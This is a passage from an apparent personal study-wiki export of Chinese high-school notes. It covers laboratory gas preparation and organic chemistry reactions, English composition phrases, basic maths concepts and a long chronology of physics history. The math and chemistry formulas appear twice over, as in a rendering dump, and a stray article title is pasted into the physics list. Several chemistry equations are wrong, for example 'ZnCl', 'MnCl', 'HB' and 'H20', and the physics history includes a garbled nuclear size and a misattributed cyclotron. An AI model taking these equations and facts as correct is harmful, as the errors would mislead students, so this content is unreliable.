(3)加热蒸发,用玻璃棒不断搅拌; （ 4)蒸发皿中出现多量固体时停止加热. 六、气体的收集 向上排空气法：密度比空气大 【 用相对原子质量与空气(约为28.8)进行比较，比空气大的可以使用。 】 向下排空气法：密度比空气小【用相对原子质量与空气(约为28.8)进行比较，比空气小的可以使用。 】 【 与空气 相近 的不能使用。 】 【需要将出气管或进气管插于瓶内底部】 排水法：1.不易溶于水； 2.不与水发生反应。 七、 检查装置的气密性 【图1】 把导管口的下端浸入水中，用双手紧握试管。如果观察到 导气管口有气泡冒出，则证明装置不漏气。 八 、仪器的洗涤 1.清洗方法:振荡、刷洗、药洗; 洗净标志:既不聚成水滴也不成股流下; 3.放置凉干:试管倒放在试管架上,其它仪器放在指定的地方. 九 、药品的存放 1、固体药品存放于广口瓶内; 2、液体药品存放于细口瓶内; 3、气体存放于集气瓶内."},{"title":"常见实验室制备方程","path":"/wiki/study-notes/chemistry/make-reactions/index.html","content":"常见实验室制备方程 常见气体实验室制备化学方程式 氧气🌟 2H2O2= ⁣= ⁣=MnO22H2O+O2↑2H_2O_2 \\stackrel{MnO_2}{=\\!=\\!=} 2H_2O + O_2↑2H2​O2​===MnO2​2H2​O+O2​↑ 2KClO3= ⁣= ⁣=ΔMnO22KCl+3O2↑2KClO_3 \\stackrel{MnO_2}{\\underset{\\text{Δ}}{=\\!=\\!=}} 2KCl + 3O_2↑2KClO3​Δ===​MnO2​​2KCl+3O2​↑ 2KMnO4= ⁣= ⁣=ΔK2MnO4+MnO2+O2↑2KMnO_4 \\stackrel{\\Delta}{=\\!=\\!=} K_2MnO_4 + MnO_2 + O_2↑2KMnO4​===ΔK2​MnO4​+MnO2​+O2​↑ 氢气🌟 Zn+2HCl= ⁣= ⁣=ZnCl+H2↑Zn+2HCl{=\\!=\\!=} ZnCl + H_2↑Zn+2HCl===ZnCl+H2​↑ Zn+H2SO4= ⁣= ⁣=ZnSO4+H2↑Zn+H_2SO_4{=\\!=\\!=} ZnSO4+ H_2↑Zn+H2​SO4​===ZnSO4+H2​↑ 二氧化碳 CaCO3+2HCl= ⁣= ⁣=CaCl2+CO2↑CaCO_3+2HCl{=\\!=\\!=} CaCl_2 + CO_2↑CaCO3​+2HCl===CaCl2​+CO2​↑ (不能用H2SO4H_2SO_4H2​SO4​) HCl 2NaCl+H2SO4(浓)= ⁣= ⁣=ΔNa2SO4+2HCl↑2NaCl+H_2SO_4(浓)\\stackrel{\\Delta}{=\\!=\\!=} Na_2SO_4 + 2HCl↑2NaCl+H2​SO4​(浓)===ΔNa2​SO4​+2HCl↑ 氨 2NH4Cl+Ca(OH)2= ⁣= ⁣=Δ2NH3↑+CaCl2+2H2O2NH_4Cl+Ca(OH)_2\\stackrel{\\Delta}{=\\!=\\!=} 2NH_3↑ + CaCl_2 + 2H_2O2NH4​Cl+Ca(OH)2​===Δ2NH3​↑+CaCl2​+2H2​O 一氧化碳 H2SO4+HCOOH= ⁣= ⁣=ΔH2O+CO↑H_2SO_4+HCOOH\\stackrel{\\Delta}{=\\!=\\!=} H_2O + CO↑H2​SO4​+HCOOH===ΔH2​O+CO↑ 一氧化氮 3Cu+8HNO3(稀)= ⁣= ⁣=Δ3Cu(NO3)2+2NO↑+4H2O3Cu+8HNO_3(稀)\\stackrel{\\Delta}{=\\!=\\!=}3Cu(NO_3)_2+2NO↑+4H_2O3Cu+8HNO3​(稀)===Δ3Cu(NO3​)2​+2NO↑+4H2​O 二氧化氮 Cu+4HNO3(浓)= ⁣= ⁣=ΔCu(NO3)2+2NO2↑+2H2OCu+4HNO_3(浓)\\stackrel{\\Delta}{=\\!=\\!=}Cu(NO_3)_2+2NO_2↑+2H_2OCu+4HNO3​(浓)===ΔCu(NO3​)2​+2NO2​↑+2H2​O 二氧化硫 Na2SO3+H2SO4(浓)= ⁣= ⁣=Na2SO4+H2O+SO2↑Na_2SO_3+H_2SO_4(浓){=\\!=\\!=}Na_2SO_4+H_2O+SO_2↑Na2​SO3​+H2​SO4​(浓)===Na2​SO4​+H2​O+SO2​↑ 三氧化硫 P2O5+3H2SO4(浓)= ⁣= ⁣=Δ2H3PO4+3SO3↑P_2O_5+3H_2SO_4(浓)\\stackrel{\\Delta}{=\\!=\\!=}2H_3PO_4 + 3SO_3↑P2​O5​+3H2​SO4​(浓)===Δ2H3​PO4​+3SO3​↑ 制硫化氢 FeS+2HCl(稀)= ⁣= ⁣=FeCl2+H2S↑FeS + 2HCl(稀){=\\!=\\!=}FeCl_2 + H_2S↑FeS+2HCl(稀)===FeCl2​+H2​S↑ Na2S+H2SO4= ⁣= ⁣=Na2SO4+H2S↑Na_2S+H_2SO_4{=\\!=\\!=}Na_2SO_4+H_2S↑Na2​S+H2​SO4​===Na2​SO4​+H2​S↑ 制甲烷 CHCl3+3Zn+3H20⟶CH4↑+3Zn(OH)ClCHCl_3+3Zn+3H_20{\\longrightarrow}CH_4↑+3Zn(OH)ClCHCl3​+3Zn+3H2​0⟶CH4​↑+3Zn(OH)Cl 其他 NaBr+H3PO4(浓)= ⁣= ⁣=NaH2PO4+HB↑NaBr+H_3PO_4(浓){=\\!=\\!=}NaH_2PO_4+HB↑NaBr+H3​PO4​(浓)===NaH2​PO4​+HB↑ NaI+H3PO4= ⁣= ⁣=NaH2PO4+HI↑NaI+H_3PO_4{=\\!=\\!=}NaH_2PO_4+HI↑NaI+H3​PO4​===NaH2​PO4​+HI↑ CaF2+H2SO4(浓)= ⁣= ⁣=CaSO4+2HF↑CaF_2+H_2SO_4(浓){=\\!=\\!=}CaSO_4+2HF↑CaF2​+H2​SO4​(浓)===CaSO4​+2HF↑ 附:氮气的制法 工业制法：分离液态空气。 实验室制法： 1.吸收空气中的O2O_2O2​、CO2CO_2CO2​、水蒸气等杂质，余下N2N_2N2​（混有稀有气体等惰性杂质，但一般影响不大）。一般用灼热的CuCuCu网的方法使O2O_2O2​被吸收：2Cu+O2= ⁣= ⁣=Δ2CuO2Cu+O_2\\stackrel{\\Delta}{=\\!=\\!=}2CuO2Cu+O2​===Δ2CuO。之前或之后依次使气体通过盛饱和碱液和浓硫酸的洗气瓶以吸收CO2CO_2CO2​和H2OH_2OH2​O。 常见气体的制取和检验 氧气 ①制取原理——含氧化合物自身分解 ②制取方程式——2KClO3= ⁣= ⁣=ΔMnO22KCl+3O2↑2KClO_3 \\stackrel{MnO_2}{\\underset{\\text{Δ}}{=\\!=\\!=}} 2KCl + 3O_2↑2KClO3​Δ===​MnO2​​2KCl+3O2​↑ ③装置——略微向下倾斜的大试管，加热（均不可使用启普发生器） 可防止冷凝水回流到热的试管底部，炸裂试管 ④检验——带火星木条，复燃 ⑤收集——排水法或向上排气法 氢气 ①制取原理——活泼金属与弱氧化性酸的置换 ②制取方程式——Zn+H2SO4= ⁣= ⁣=ZnSO4+H2↑Zn+H_2SO_4{=\\!=\\!=}ZnSO_4+H_2↑Zn+H2​SO4​===ZnSO4​+H2​↑ ③装置——启普发生器 ④检验——点燃，淡蓝色火焰，在容器壁上有水珠 ⑤收集——排水法或向下排气法 氯气🌟 ①制取原理——强氧化剂氧化含氧化合物 ②制取方程式——MnO2+4HCl(浓)= ⁣= ⁣=ΔMnCl2+Cl2↑+2H2OMnO_2+4HCl(浓)\\stackrel{\\Delta}{=\\!=\\!=}MnCl_2+Cl_2↑+2H_2OMnO2​+4HCl(浓)===ΔMnCl2​+Cl2​↑+2H2​O 上面的要加热，这个不用：2KMnO4+16HCl(浓)= ⁣= ⁣=5Cl2↑+2KCl+2MnCl+8H2O2KMnO_4 + 16HCl(浓){=\\!=\\!=} 5Cl_2↑ + 2KCl + 2MnCl + 8H_2O2KMnO4​+16HCl(浓)===5Cl2​↑+2KCl+2MnCl+8H2​O ③装置——分液漏斗,圆底烧瓶,加热 ④检验——能使湿润的蓝色石蕊试纸先变红后褪色; 名称 颜色变化 蓝色石蕊试纸 遇碱变蓝 红色石蕊试纸 遇酸变红 紫色石蕊溶液 遇酸变红，遇碱变蓝 ⑤除杂质——先通入饱和食盐水(除HClHClHCl),再通入浓H2SO4H_2SO_4H2​SO4​(除水蒸气) ⑥收集——排饱和食盐水法或向上排气法 Cl2(HCl)Cl_2(HCl)Cl2​(HCl)溶于水以后生成HClOHClOHClO，H+H^+H+和Cl−Cl^-Cl−。饱和食盐水通过引入大量Cl−Cl^-Cl−抑制反应进程，同理使用H2SO4H_2SO_4H2​SO4​引入大量H+H^+H+也可以实现 ⑦尾气回收——Cl2+2NaOH= ⁣= ⁣=NaCl+NaClO+H2OCl_2+2NaOH{=\\!=\\!=}NaCl+NaClO+H_2OCl2​+2NaOH===NaCl+NaClO+H2​O 硫化氢 ①制取原理——强酸与强碱的复分解反应 ②制取方程式——FeS+2HCl= ⁣= ⁣=FeCl2+H2S↑FeS+2HCl{=\\!=\\!=}FeCl_2+H_2S↑FeS+2HCl===FeCl2​+H2​S↑ ③装置——启普发生器 ④检验——能使湿润的醋酸铅试纸变黑 ⑤除杂质——先通入饱和NaHSNaHSNaHS溶液(除HClHClHCl),再通入固体CaCl2CaCl_2CaCl2​(或P2O5P_2O_5P2​O5​)(除水蒸气) ⑥收集——向上排气法 ⑦尾气回收——H2S+2NaOH= ⁣= ⁣=Na2S+H2OH_2S+2NaOH{=\\!=\\!=}Na_2S+H_2OH2​S+2NaOH===Na2​S+H2​O或H2S+NaOH= ⁣= ⁣=NaHS+H2OH_2S+NaOH{=\\!=\\!=}NaHS+H_2OH2​S+NaOH===NaHS+H2​O 二氧化硫 ①制取原理——稳定性强酸与不稳定性弱酸盐的复分解 ②制取方程式——Na2SO3+H2SO4= ⁣= ⁣=Na2SO4+SO2↑+H2ONa_2SO_3+H_2SO_4{=\\!=\\!=}Na_2SO_4+SO_2↑+H2ONa2​SO3​+H2​SO4​===Na2​SO4​+SO2​↑+H2O ③装置——分液漏斗,圆底烧瓶 ④检验——先通入品红试液,褪色,后加热又恢复原红色; ⑤除杂质——通入浓H2SO4H_2SO_4H2​SO4​(除水蒸气) ⑥收集——向上排气法 ⑦尾气回收——SO2+2NaOH= ⁣= ⁣=Na2SO3+H2OSO_2+2NaOH{=\\!=\\!=}Na_2SO_3+H_2OSO2​+2NaOH===Na2​SO3​+H2​O 二氧化碳 ①制取原理——稳定性强酸与不稳定性弱酸盐的复分解 ②制取方程式——CaCO3+2HCl= ⁣= ⁣=CaCl2+CO2↑+H2OCaCO_3+2HCl{=\\!=\\!=}CaCl_2+CO_2↑+H_2OCaCO3​+2HCl===CaCl2​+CO2​↑+H2​O ③装置——启普发生器（可以及时控制反应的发生或停止） ④检验——通入澄清石灰水,变浑浊 ⑤除杂质——通入饱和NaHCO3NaHCO_3NaHCO3​(除HClHClHCl) ⑥收集——向上排气法 乙炔 ①制取原理——广义水解 ②制取方程式——CaC2+2H2O⟶Ca(OH)2+C2H2↑CaC_2+2H_2O{\\longrightarrow}Ca(OH)_2+C_2H_2↑CaC2​+2H2​O⟶Ca(OH)2​+C2​H2​↑（常用饱和食盐水代替水） ③装置——分液漏斗，圆底烧瓶 ④相关现象——通入酸性高锰酸钾溶液时：紫色溶液褪色，溴的四氯化碳溶液时：棕色溶液褪色，点燃纯净的乙炔气时：发出明亮的火焰并带很浓的黑烟（点燃前需要验纯） ⑤除杂质——通入CuSO4CuSO_4CuSO4​溶液（除H2SH_2SH2​S等，Cu2++H2S= ⁣= ⁣=CuS↓+2H+Cu^{2+}+H_2S{=\\!=\\!=}CuS↓+2H^+Cu2++H2​S===CuS↓+2H+）"},{"title":"常见实验&方程","path":"/wiki/study-notes/chemistry/reactions/index.html","content":"有机 乙炔 俗称电石气是最简单的炔烃 实验室制取：使用电石（CaC2CaC_2CaC2​）和水反应制取 后续实验装置： image-20240701135730657 image-20240701135715745 注： 电石与水反应非常剧烈，为了减小其反应速率，可用饱和氯化钠溶液代替水作反应试剂。 乙炔中通常会含有H2SH_2SH2​S，PH3PH_3PH3​，NH3NH_3NH3​等杂质气体，可用CuSO4CuSO_4CuSO4​溶液吸收（有黑色沉淀生成）。点燃或检验前需除杂（H2SH_2SH2​S具有还原性） 类比得制取丙炔 image-20240701135936117 不可使用启普发生器：①碳化钙吸水性强，与水反应剧烈，不能随用随停;②反应放出大量热，易使启普发生器炸裂；③生成的氢氧化钙呈糊状容易堵塞球形漏斗。 烧瓶内导气管处可塞棉花，防止CaC2CaC_2CaC2​与水反应时生成的泡沫涌入导气管 需控制水慢慢滴下：控制反应速率，使产生的气流平稳，避免产生的泡沫进入导管 image-20240701141042629 苯 IMG_20240701_0010 IMG_20240701_0011 image-20240701141156998 烃 卤代烃 取代反应（水解反应） image-20240701141337858 消去反应 image-20240701141419543 条件：1.邻位碳原子上必须有氢原子 2.氢氧化钠的乙醇溶液加热 像这样，有机化合物在一定条件下，从一个分子中脱去一个或几个小分子（如H2OH_2OH2​O、HXHXHX等），而生成含不饱和键的化合物的反应叫做消去反应（消除反应）。 醇 取代反应 image-20240701141759875 消去反应 分子内脱水 170 分子间脱水（分子间的取代反应） 140 注：当指明反应物是乙醇时则写温度，否则写加热即可 置换反应 2C2H5OH+2Na⟶2C2H5ONa+H2↑2C_2H_5OH+2Na{\\longrightarrow}2C_2H_5ONa+H_2↑2C2​H5​OH+2Na⟶2C2​H5​ONa+H2​↑ 用于测量有机物(醇分子)内的羟基个数 钠与氢气为2:1的关系!! 酚 酸性 酸性强弱对照表（在左上方的能和其反应，即强酸制弱酸） 取代反应 image-20240701142831628 显色反应 苯酚与FeCl3FeCl_3FeCl3​溶液作用显紫色 主要是与Fe3+Fe^{3+}Fe3+反应，Fe3+Fe^{3+}Fe3+可以与苯酚和硫氰酸（HSCNHSCNHSCN）（呈血红色）发生显色反应 乙醛 IMG_20240701_0014 羧酸 比较酸性强弱： image-20240701145008174 酯化反应: IMG_20240701_0015 酸脱羟基醇脱氢 在实验中碳酸钠的作用为：除去乙酸，溶解乙醇，降低乙酸乙酯溶解度 酯类写同分异构用命名法 酯类的水解：在酸或碱存在的条件下，酯可以发生水解反应生成相应的羧酸和醇，酯的水解反应是酯化反应的逆反应。酸性下可逆，碱性下不可逆。 油脂在碱性溶液中的水解反应又称为皂化反应 酰胺的水解 image-20240701145323730 有机合成 IMG_20240701_0016 蛋白质 成肽反应 向蛋白质溶液加入浓硝酸会有白色沉淀产生，加热后沉淀变黄色。含有苯环的蛋白质均能发生这 个反应。皮肤、指甲不慎沾上浓硝酸会出现黄色就是由此 造成的。 合成高分子 加聚反应 image-20240701145853938 缩聚反应 image-20240701145937052 image-20240701145945422 合成酚醛树脂或脲醛树脂 酚醛树脂 脲醛树脂 天然橡胶 顺式聚异戊二烯"},{"title":"课本内容","path":"/wiki/study-notes/chemistry/text/index.html","content":"元素周期表 注意Sc,V,Cr,As,Se，最后一列为0族 不溶性表"},{"title":"不规则动词(变时态)","path":"/wiki/study-notes/english/irregular-verbs/index.html","content":""},{"title":"大作文（读后续写）","path":"/wiki/study-notes/english/big-composition/index.html","content":"好句 Her eyes were shining and her heart was fluttering with excitement.(eyes dancing with joy and sweetness) 她的眼睛闪闪发光，心中充满激动。 All of a sudden my mind went blank. 突然间，我的脑海一片空白。 In spite of having gone through limitless miseries, he still persevered in pursuing his dream. 尽管经历了无数苦难，他仍坚持追求自己的梦想。 Scared and helpless,she walked around,trying to find a temporary shelter for the night. 她又害怕又无助地四处走动，试图找到一个临时的住所过夜。 It was at the very moment that money could do nothing but supply some temporary pleasure. 就在那一刻/突然，（我意识到）金钱只能提供暂时的快感。 On seeing the terrifying scene,the little girl was dominated by extreme fright. 看到那恐怖的场景，小女孩感到极度害怕/被害怕的情绪所支配"},{"title":"小作文（应用作文）","path":"/wiki/study-notes/english/small-composition/index.html","content":"纸质资料 范文活动报道 好句 等待修改 It can’t be more normal for us students to occasionally perform badly/poorly in our studies. 我们学生偶尔学习成绩不佳是再正常不过的事。 邀请函 开篇 Learning/Hearing that you are crazy about&nbsp;traditional Chinese culture,I'm writing to invite you to join&nbsp;xxxx,which will be held in our school next week. 喜爱：be keen on / be fond of / have a great passion for 邀请：extend a cordial invitation to (诚邀) 参加：participate in / join in (join sb. in 参加某人的…活动) / take part in / attend 参加（n.）：attendance / participation 举办：be held / take place 过程 介绍活动 The contest, whose topic is &quot;Traditional Chinese Culture&quot;, will take place in the lecture hall of our school at 9 am this coming Sunday. （篇一） To start with, this concert is scheduled for this Saturday evening from 7 p.m. to 10 p.m in the lecture hall. What’s more, the concert is about Chinese folk music, and the players are the top musicians in China.（篇二） As scheduled, the exhibition will be held in our school exhibition hall on Saturday, which will last for a week. During the exhibition, a wide range of activities will be held, enabling you to have a better understanding of traditional Chinese culture. It will provide you with a platform to appreciate a number of works created by well-known artists in China. In addition, it is also a: good chance for you to enjoy some fantastic performances. I'm confident that you will have a wonderful time.（篇九） 发出邀请 This is a golden chance to show your fluent Chinese that can’t be missed. If interested, register for it before January 10.（篇一） If interested, please write to me as soon as possible in order to confirm your participation! 结尾 I would appreciate it very much if you could take my invitation into account/consideration.如果你能接受我的邀请，我会非常感激。 Looking forward to your early reply/coming/participation. 希望你能早日回信/希望你能参加 Look forward to your reply at your earliest convenience.\t期待您尽早回复。 I sincerely hope that you can attend the exhibition. Please contact me to let me know your decision as soon as possible. Your early reply will be highly appreciated. 我衷心希望您能参加展览。请尽快与我联系以告诉我您的决定。如果您能尽早回复，我将不胜感激。 I would be elated if you could join us and partake in this remarkable event with us. 如果您能加入我们，与我们共同参与这一非凡的活动，我将感到非常高兴。 If you want to get more Information/advice/suggestions, please contact me at your convenience/when it's convenient to/for you. 如果您想了解更多信息，请随时与我联系。 结构类 万金油 How is everything going? 一切都还好吗？ Hope this email finds you well. 见信好。 连接词 EN CN In my humble/modest opinion. 依鄙人之见 First and foremost,… = First of all,… = Firstly,… To begin/start with,… = Most importantly, 首先 yet,however,nevertheless,in contrast (to),whereasin spite of(despite),instead,on the contrary,even if(though),unlike,conversely 表对比与转折 and,as well as,then,moreover,futhermore,in addition,additionally,besides,what’s more,last but not least 表递进 as a result/consequence,for this reason,hence,accordingly,so,therefore,thus,thereby 表结果 in a word,in belief,in short,in all,above all,to conclude,in conclusion,on the whole,to sum up,in summary 表总结 owing to,due to,because of 因为，由于 In the end,… = Finally,… = All in all,… 最后 句型 老实说，说老实话：1.To be honest,… 2.Honestly speaking 特定搭配 EN CN Chinese speech contest for foreign students 为留学生开办的中文演讲比赛 Chinese folk music 中国民间音乐 traditional Chinese culture 中国传统文化 motivational speech 励志演讲 School Art Festival Concert 校园艺术节音乐会 Student Union 学生会 Rural China 乡土中国 library assistant 图书管理员"},{"title":"语法","path":"/wiki/study-notes/english/vocabulary/index.html","content":"单词 conflict fall fall - fell - fallen fall behind in sth. 在某方面落后 find pace senior take take - took - taken turn 句型 高级词汇替换 口诀 变现在分词 lie,die,tie,将ie改成y，再加ing 同义单词 得到，获得：gain，get，obtain，还有一个attain~"},{"title":"公式表","path":"/wiki/study-notes/physics/formulas/index.html","content":"数据迁移至File Browser"},{"title":"概念","path":"/wiki/study-notes/maths/conceptions/index.html","content":"虚数 z=ax+biz = ax+bi z=ax+bi 实数a和b分别被称为复数的实部和虚部 当且仅当a=0,b≠0时，zzz为纯虚数 ∣z∣=a2+b2|z| = \\sqrt{a^2+b^2} ∣z∣=a2+b2​ 百分位数 计算第p百分位数 以递增顺序排列原始数据 计算 i＝npi＝np%i＝np ①若 iii 不是整数，将 iii 向上取整．大于iii的比邻整数即为第ppp百分位数的位置； ②若iii是整数，则第ppp百分位数是第iii项与第(i＋1)(i＋1)(i＋1)项数据的平均值。 各种百分位数 均值不等式 21a+1b≤ab≤a+b2≤a2+b22\\frac{2}{\\frac{1}{a} + \\frac{1}{b}} \\leq \\sqrt{ab} \\leq \\frac{a + b}{2} \\leq \\sqrt{\\frac{a^2 + b^2}{2}} a1​+b1​2​≤ab​≤2a+b​≤2a2+b2​​ 分别为：调和平均数，几何平均数，算术平均数，平方平均数 当前仅当a等于b时取等号"},{"title":"物理学史","path":"/wiki/study-notes/physics/history/index.html","content":"力学 1、1638年，意大利物理学家伽利略在《两种新科学的对话》中用科学推理论证重物体和轻物体下落一样快；并在比萨斜塔做了两个不同质量的小球下落的实验，证明了他的观点是正确的，推翻了古希腊学者亚里士多德的观点（即：质量大的小球下落快是错误的）。 2、1654年，德国的马德堡市做了一个轰动一时的实验——马德堡半球实验。 3、1687年，英国科学家牛顿在《自然哲学的数学原理》著作中提出了三条运动定律（即牛顿三大运动定律）。 4、17世纪，伽利略通过构思的理想实验指出：在水平面上运动的物体若没有摩擦，将保持这个速度一直运动下去；得出结论：力是改变物体运动的原因，推翻了亚里士多德的观点：力是维持物体运动的原因。 同时代的法国物理学家笛卡儿进一步指出：如果没有其它原因，运动物体将继续以同速度沿着一条直线运动，既不会停下来，也不会偏离原来的方向。 5、英国物理学家胡克对物理学的贡献：胡克定律；经典题目：胡克认为只有在一定的条件下，弹簧的弹力才与弹簧的形变量成正比。 6、1638年，伽利略在《两种新科学的对话》一书中，运用观察－假设－数学推理的方法，详细研究了抛体运动。 17世纪，伽利略通过理想实验法指出：在水平面上运动的物体若没有摩擦，将保持这个速度一直运动下去；同时代的法国物理学家笛卡儿进一步指出：如果没有其它原因，运动物体将继续以同速度沿着一条直线运动，既不会停下来，也不会偏离原来的方向。 7、人们根据日常的观察和经验，提出“地心说”，古希腊科学家托勒密是代表；而波兰天文学家哥白尼提出了“日心说”，大胆反驳地心说。 8、17世纪，德国天文学家开普勒提出开普勒三大定律。 9、牛顿于1687年正式发表万有引力定律；1798年英国物理学家卡文迪许利用扭秤实验装置比较准确地测出了引力常量； 10、1846年，英国剑桥大学学生亚当斯和法国天文学家勒维烈（勒维耶）应用万有引力定律，计算并观测到海王星，1930年，美国天文学家汤苞用同样的计算方法发现冥王星。 俄国科学家齐奥尔科夫斯基被称为近代火箭之父，他首先提出了多级火箭和惯性导航的概念。多级火箭一般都是三级火箭，我国已成为掌握载人航天技术的第三个国家。 1957年10月，苏联发射第一颗人造地球卫星；1961年4月，世界第一艘载人宇宙飞船“东方1号”带着尤里加加林第一次踏入太空。 11、20世纪初建立的量子力学和爱因斯坦提出的狭义相对论表明经典力学不适用于微观粒子和高速运动物体。 12、17世纪，德国天文学家开普勒提出开普勒三定律；牛顿于1687年正式发表万有引力定律；1798年英国物理学家卡文迪许利用扭秤装置比较准确地测出了引力常量（体现放大和转换的思想）；1846年，科学家应用万有引力定律，计算并观测到海王星。 电磁学 13、1785年法国物理学家库仑利用扭秤实验发现了电荷之间的相互作用规律——库仑定律，并测出了静电力常量k的值。 14、1752年，富兰克林在费城通过风筝实验验证闪电是放电的一种形式，把天电与地电统一起来，并发明避雷针。 15、1837年，英国物理学家法拉第最早引入了电场概念，并提出用电场线表示电场。 16、1913年，美国物理学家密立根通过油滴实验精确测定了元电荷e电荷量，获得诺贝尔奖。 17、1826年德国物理学家欧姆（1787-1854）通过实验得出欧姆定律。 18、1911年，荷兰科学家昂尼斯（或昂纳斯）发现大多数金属在温度降到某一值时，都会出现电阻突然降为零的现象——超导现象。 19、19世纪，焦耳和楞次先后各自独立发现电流通过导体时产生热效应的规律，即焦耳——楞次定律。 20、1820年，丹麦物理学家奥斯特发现电流可以使周围的小磁针发生偏转，称为电流磁效应。 21、法国物理学家安培发现两根通有同向电流的平行导线相吸，反向电流的平行导线则相斥，同时提出了安培分子电流假说；并总结出安培定则（右手螺旋定则）判断电流与磁场的相互关系和左手定则判断通电导线在磁场中受到磁场力的方向。 22、荷兰物理学家洛仑兹提出运动电荷产生了磁场和磁场对运动电荷有作用力（洛仑兹力）的观点。 23、英国物理学家汤姆生发现电子，并指出：阴极射线是高速运动的电子流。 24、汤姆生的学生阿斯顿设计的质谱仪可用来测量带电粒子的质量和分析同位素。 25、1932年，美国物理学家劳伦兹发明了回旋加速器能在实验室中产生大量的高能粒子。（最大动能仅取决于磁场和D形盒直径。带电粒子圆周运动周期与高频电源的周期相同；但当粒子动能很大，速率接近光速时，根据狭义相对论，粒子质量随速率显著增大，粒子在磁场中的回旋周期发生变化，进一步提高粒子的速率很困难。 26、1831年英国物理学家法拉第发现了由磁场产生电流的条件和规律——电磁感应定律。 27、1834年，俄国物理学家楞次发表确定感应电流方向的定律——楞次定律。 28、1835年，美国科学家亨利发现自感现象（因电流变化而在电路本身引起感应电动势的现象），日光灯的工作原理即为其应用之一，双绕线法制精密电阻为消除其影响应用之一。 动量、波粒二象性、原子物理（3-5） 29、1900年，德国物理学家普朗克为解释物体热辐射规律提出：电磁波的发射和吸收不是连续的，而是一份一份的，把物理学带进了量子世界。受其启发1905年爱因斯坦提出光子说，成功地解释了光电效应规律，因此获得诺贝尔物理奖。 30、1922年，美国物理学家康普顿在研究石墨中的电子对x射线的散射时——康普顿效应，证实了光的粒子性（说明动量守恒定律和能量守恒定律同时适用于微观粒子） 31、1913年，丹麦物理学家玻尔提出了自己的原子结构假说，成功地解释和预言了氢原子的辐射电磁波谱，为量子力学的发展奠定了基础。 32、1924年，法国物理学家德布罗意大胆预言了实物粒子在一定条件下会表现出波动性。 33、1927年美。英两国物理学家得到了电子束在金属晶体上的衍射图案。电子显微镜与光学显微镜相比，衍射现象影响小很多，大大地提高了分辨能力，质子显微镜的分辨本能更高。 34、1858年，德国科学家普里克发现了一种奇妙的射线–阴极射线（高速运动的电子流）。 35、1906年，英国物理学家汤姆生发现电子，获得诺贝尔物理学奖。 36、1913年，美国物理学家密立根通过油滴实验精确测定了元电荷e电荷量，获得诺贝尔奖。 37、1897年，汤姆生利用阴极射线管发现了电子，说明原子可分，有复杂内部结构，并提出原子的枣糕模型。 38、1909～1911年，英国物理学家卢瑟福和助手们进行了α粒子散射实验，并提出了原子的核式结构模型。由实验结果估计原子核直径数量级为10m～15m。1919年，卢瑟福用α粒子轰击氮核，第一次实现了原子核的人工转变，并发现了质子。预言原子核内还有另一种粒子，被其学生查德威克于1932年在α粒子轰击铍核时发现，由此人们认识到原子核由质子和中子组成。 39、1885年，瑞士的中学数学教师巴耳末总结了氢原子光谱的波长规律——巴耳末系。 40、1913年，丹麦物理学家波尔最先得出氢原子能级表达式。 41、1896年，法国物理学家贝克勒尔发现天然放射现象，说明原子核有复杂的内部结构。天然放射现象：有两种衰变（α、β），三种射线（α、β、γ），其中γ射线是衰变后新核处于激发态，向低能级跃迁时辐射出的。衰变快慢与原子所处的物理和化学状态无关。 42、1896年，在贝克勒尔的建议下，玛丽-居里夫妇发现了两种放射性更强的新元素–钋（Po）镭（Ra）。 43、1919年，卢瑟福用α粒子轰击氮核，第一次实现了原子核的人工转变，发现了质子，并预言原子核内还有另一种粒子——中子。 44、1932年，卢瑟福学生查德威克于在α粒子轰击铍核时发现中子，获得诺贝尔物理奖。 45、1934年，约里奥－居里夫妇用α粒子轰击铝箔时，发现了正电子和人工放射性同位素。 46、1939年12月，德国物理学家哈恩和助手斯特拉斯曼用中子轰击铀核时，铀核发生裂变。 47、1942年，在费米。西拉德等人领导下，美国建成第一个裂变反应堆（由浓缩铀棒、控制棒、中子减速剂、水泥防护层、热交换器等组成）。 48、1952年，美国爆炸了世界上第一颗氢弹（聚变反应、热核反应）。人工控制核聚变的一个可能途径是：利用强激光产生的高压照射小颗粒核燃料。 49、1932年发现了正电子，1964年提出夸克模型。 粒子分三大类： 媒介子——传递各种相互作用的粒子，如：光子。 轻子——不参与强相互作用的粒子，如：电子、中微子。 强子——参与强相互作用的粒子，如：重子（质子、中子、超子）和介子，强子由更基本的粒子夸克组成，夸克带电量可能为元电荷。 Ⅱ．选考部分（选修3-3、3-4） 热学（3-3） 50、1827年，英国植物学家布朗发现悬浮在水中的花粉微粒不停地做无规则运动的现象——布朗运动。 51、19世纪中叶，由德国医生迈尔。英国物理学家焦尔。德国学者亥姆霍兹最后确定能量守恒定律。 52、1850年，克劳修斯提出热力学第二定律的定性表述：不可能把热从低温物体传到高温物体而不产生其他影响，称为克劳修斯表述。 次年开尔文提出另一种表述：不可能从单一热源取热，使之完全变为有用的功而不产生其他影响，称为开尔文表述。 53、1848年，开尔文提出热力学温标，指出绝对零度（-273.15℃）是温度的下限。热力学温标与摄氏温度转换关系为T=t+273.15K。 热力学第三定律：热力学零度不可达到。 波动学、光学、相对论（3-4） 54、17世纪，荷兰物理学家惠更斯确定了单摆周期公式。周期是2s的单摆叫秒摆。 55、1690年，荷兰物理学家惠更斯提出了机械波的波动现象规律–惠更斯原理。 56、奥地利物理学家多普勒（1803～1853）首先发现由于波源和观察者之间有相对运动，使观察者感到频率发生变化的现象——多普勒效应(相互接近，f增大。相互远离，f减少)。 57、1864年，英国物理学家麦克斯韦发表《电磁场的动力学理论》的论文，提出了电磁场理论，预言了电磁波的存在，指出光是一种电磁波，为光的电磁理论奠定了基础。电磁波是一种横波。 58、1887年，德国物理学家赫兹用实验证实了电磁波的存在，并测定了电磁波的传播速度等于光速。 59、1894年，意大利马可尼和俄国波波夫分别发明了无线电报，揭开无线电通信的新篇章。 60、1800年，英国物理学家赫歇耳发现红外线。1801年，德国物理学家里特发现紫外线。1895年，德国物理学家伦琴发现x射线（伦琴射线），并为他夫人的手拍下世界上第一张x射线的人体照片。 61、1621年，荷兰数学家斯涅耳找到了入射角与折射角之间的规律——折射定律。 62、1801年，英国物理学家托马斯·杨成功地观察到了光的干涉现象。 63、1818年，法国科学家菲涅尔和泊松计算并实验观察到光的圆板衍射——泊松亮斑。 64、1864年，英国物理学家麦克斯韦预言了电磁波的存在，并指出光是一种电磁波。1887年，赫兹用实验证实了电磁波的存在，光是一种电磁波2015年高考物理学史总结5篇2015年高考物理学史总结5篇。 65、1905年，爱因斯坦提出了狭义相对论，有两条基本原理： ①相对性原理——不同的惯性参考系中，一切物理规律都是相同的。 ②光速不变原理——不同的惯性参考系中，光在真空中的速度一定是c不变。 